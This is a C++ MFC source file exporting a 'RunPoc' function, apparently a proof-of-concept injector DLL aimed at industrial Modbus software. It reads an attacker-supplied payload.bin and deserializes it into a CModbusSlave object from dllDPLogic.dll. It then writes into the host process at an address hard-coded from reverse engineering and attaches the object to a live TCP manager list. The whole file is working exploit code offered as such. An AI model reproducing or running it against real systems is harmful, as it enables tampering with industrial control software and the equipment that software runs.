#include <afx.h>
#include <afxwin.h>
#include <afxtempl.h>
#include <vector>

#define IDA_BASE 0x00400000
#define TCP_MANAGER_IDA_ADDR 0x0084713C

void ShowError(LPCTSTR msg) {
    ::MessageBox(NULL, msg, _T("Injector Error"), MB_OK | MB_ICONERROR);
}

extern "C" __declspec(dllexport) void RunPoc()
{
    AFX_MANAGE_STATE(AfxGetStaticModuleState());

    CFile file;
    if (!file.Open(_T("C:\\payload.bin"), CFile::modeRead | CFile::typeBinary)) {
        ShowError(_T("Payload not found"));
        return;
    }
    ULONGLONG size = file.GetLength();
    std::vector<BYTE> buffer((size_t)size);
    file.Read(buffer.data(), (UINT)size);
    file.Close();

    CMemFile memFile(buffer.data(), (UINT)size);
    CArchive ar(&memFile, CArchive::load);

    HMODULE hDll = GetModuleHandle(_T("dllDPLogic.dll"));
    if (!hDll) {
        ShowError(_T("dllDPLogic not loaded"));
        return;
    }

    typedef CRuntimeClass* (__stdcall* PGET_CLASS)();
    FARPROC proc = GetProcAddress(hDll, "?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ");
    if (!proc) {
        ShowError(_T("Factory not found"));
        return;
    }

    PGET_CLASS getClass = reinterpret_cast<PGET_CLASS>(proc);
    CRuntimeClass* pClass = getClass();
    CObject* pObj = pClass->CreateObject();

    if (!pObj) {
        ShowError(_T("CreateObject failed"));
        return;
    }

    try {
        pObj->Serialize(ar);
    } catch (CException* e) {
        e->Delete();
        ShowError(_T("Serialize Failed"));
        delete pObj;
        return;
    }

    DWORD_PTR baseAddr = (DWORD_PTR)GetModuleHandle(NULL);
    DWORD_PTR offset = TCP_MANAGER_IDA_ADDR - IDA_BASE;
    void** pManagerPtr = (void**)(baseAddr + offset);

    if (IsBadReadPtr(pManagerPtr, 4)) {
        CString msg;
        msg.Format(_T("Calculated address is invalid!\nBase: %p, Offset: %X, Target: %p"),
                   baseAddr, (unsigned int)offset, pManagerPtr);
        ShowError(msg);
        return;
    }

    CObject* pManager = (CObject*)(*pManagerPtr);
    if (!pManager) {
        ShowError(_T("Manager is NULL (Open a project first)"));
        return;
    }

    try {
        CObList* pList = (CObList*)pManager;
        pList->AddTail(pObj);

        ::MessageBox(NULL, _T("🎉 Success: Attached via standard MFC!"), _T("Done"), MB_OK);
        pObj = nullptr;
    }
    catch (...) {
        ShowError(_T("Crash during AddTail"));
    }

    if (pObj) {
        delete pObj;
    }
    ar.Close();
    memFile.Close();
}
